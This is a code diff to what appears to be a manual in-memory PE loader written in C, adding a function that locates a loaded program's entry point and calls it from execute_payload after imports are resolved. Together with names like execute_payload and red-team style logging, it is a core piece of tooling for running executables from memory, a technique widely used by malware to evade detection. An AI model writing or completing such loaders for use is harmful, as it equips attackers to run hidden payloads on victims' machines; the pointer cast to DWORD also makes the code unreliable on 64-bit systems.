@@ -404,6 +404,7 @@ int resolve_imports(const unsigned char* payload, PE_CONTEXT* pe_ctx)
             {
                 found = 1;
                 iat_section_index = i;
+                break;
             }
         }
 
@@ -427,6 +428,7 @@ int resolve_imports(const unsigned char* payload, PE_CONTEXT* pe_ctx)
             {
                 found = 1;
                 ilt_section_index = i;
+                break;
             }
         }
 
@@ -484,6 +486,42 @@ int resolve_imports(const unsigned char* payload, PE_CONTEXT* pe_ctx)
     return 0;
 }
 
+int transfer_control(PE_CONTEXT* pe_ctx)
+{
+    printf("[+] Transferring control to loaded program's entry point ...\n");
+
+    // Find the section whose virtual address range contains the entry point address
+    int found = 0; 
+    DWORD section_index;
+    DWORD entry_point_rva = pe_ctx->address_of_entry;
+    for (DWORD i = 0; i < pe_ctx->number_of_sections; i++)
+    {
+        if ((pe_ctx->section_headers[i].VirtualAddress <= entry_point_rva) && (entry_point_rva <= pe_ctx->section_headers[i].VirtualAddress + pe_ctx->section_headers[i].SizeOfRawData))
+        {
+            found = 1;
+            section_index = i;
+            break;
+        }
+    }
+
+    if (found == 0)
+    {
+        fprintf(stderr, "[!] Failed to find section containing entry point.\n");
+        return 1;
+    }
+
+    // Compute the in-memory address of the entry point
+    LPVOID entry_point_address = (LPVOID)((DWORD)pe_ctx->mapped_sections_info[section_index].base_address + (entry_point_rva - pe_ctx->section_headers[section_index].VirtualAddress));
+
+    // Assuming the entry point does not expect any arguments and returns an int
+    int (*entry_point)() = (int (*)())entry_point_address;
+
+    // Call the entry point
+    int result = entry_point();
+
+    return result;
+}
+
 int execute_payload(const unsigned char* payload, const size_t payload_size)
 {
     // Validate the received payload
@@ -514,6 +552,14 @@ int execute_payload(const unsigned char* payload, const size_t payload_size)
     if (resolve_imports(payload, &pe_ctx) != 0)
     {
         fprintf(stderr, "[!] Failed to resolve imports.\n");
+        cleanup_context(&pe_ctx);
+        return 1;
+    }
+
+    // Transfer control to entry point
+    if (transfer_control(&pe_ctx) != 0)
+    {
+        fprintf(stderr, "[!] Failed to transfer control.\n");
         cleanup_context(&pe_ctx);
         return 1;
     }
